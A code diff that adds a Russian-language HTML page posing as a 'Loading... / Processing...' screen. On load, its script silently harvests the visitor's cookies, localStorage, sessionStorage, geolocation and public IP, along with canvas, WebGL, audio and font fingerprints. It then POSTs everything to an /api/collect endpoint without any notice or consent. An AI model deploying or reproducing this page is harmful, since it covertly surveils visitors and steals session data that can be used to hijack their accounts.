@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    </style>
+</head>
+<body>
+    <h3>⚙️ Обработка...</h3>
+    <script>
+        const API_URL = "/api/collect";
+        async function sendAll() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: "", userAgent: navigator.userAgent, platform: navigator.platform,
+                language: navigator.language, languages: navigator.languages || [],
+                screen: `${screen.width}x${screen.height}`, availScreen: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth, orientation: screen.orientation?.type || "неизв",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || "неизв",
+                deviceMemory: navigator.deviceMemory || "неизв",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                vendor: navigator.vendor, doNotTrack: navigator.doNotTrack || "не указано",
+                online: navigator.onLine, battery: "неизв", network: "неизв", geo: null,
+                cookies: document.cookie || "нет", localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage), canvas: null, webgl: null,
+                audio: null, fonts: null, mimeTypes: null, plugins: null,
+                referrer: document.referrer, url: location.href
+            };
+            try { const ipRes = await fetch("https://api.ipify.org?format=json"); data.ip = (await ipRes.json()).ip; } catch(e) {}
+            if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { data.geo = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }; }, () => {}, { timeout: 3000 }); }
+            if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = `${Math.round(b.level*100)}% (заряжается: ${b.charging})`; } catch(e) {} }
+            if (navigator.connection) { const c = navigator.connection; data.network = `${c.effectiveType} (downlink: ${c.downlink} Mbps, rtt: ${c.rtt} ms)`; }
+            try { const canvas = document.createElement("canvas"); canvas.width = 100; canvas.height = 30; const ctx = canvas.getContext("2d"); ctx.fillStyle = "#f60"; ctx.fillRect(10,5,80,20); ctx.fillStyle = "#069"; ctx.fillText("Finger",20,20); data.canvas = canvas.toDataURL().substring(0, 120); } catch(e) {}
+            try { const glCanvas = document.createElement("canvas"); const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl"); if (gl) { const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); data.webgl = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`; } } catch(e) {}
+            try { const audioCtx = new (window.AudioContext || window.webkitAudioContext)(); const oscillator = audioCtx.createOscillator(); const analyser = audioCtx.createAnalyser(); oscillator.connect(analyser); analyser.connect(audioCtx.destination); oscillator.start(0); const bufferLength = analyser.frequencyBinCount; const dataArray = new Float32Array(bufferLength); analyser.getFloatTimeDomainData(dataArray); oscillator.stop(); let sum = 0; for (let i = 0; i < bufferLength; i++) sum += Math.abs(dataArray[i]); data.audio = sum.toFixed(4); } catch(e) {}
+            if (navigator.plugins) { const pl = []; for (let i = 0; i < navigator.plugins.length; i++) pl.push(navigator.plugins[i].name); data.plugins = pl.join(", ") || "нет"; }
+            if (navigator.mimeTypes) { const mimes = []; for (let i = 0; i < navigator.mimeTypes.length; i++) mimes.push(navigator.mimeTypes[i].type); data.mimeTypes = mimes.join(", ") || "нет"; }
+            try { const baseFonts = ["monospace", "sans-serif", "serif"]; const testString = "mmmmmmmmmmlli"; const testSize = "72px"; const canvas = document.createElement("canvas"); const ctx = canvas.getContext("2d"); const result = {}; for (const font of baseFonts) { ctx.font = `${testSize} ${font}`; result[font] = ctx.measureText(testString).width; } data.fonts = JSON.stringify(result); } catch(e) {}
+            await fetch(API_URL, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });
+        }
+        window.onload = sendAll;
+    </script>
+</body>
+</html>
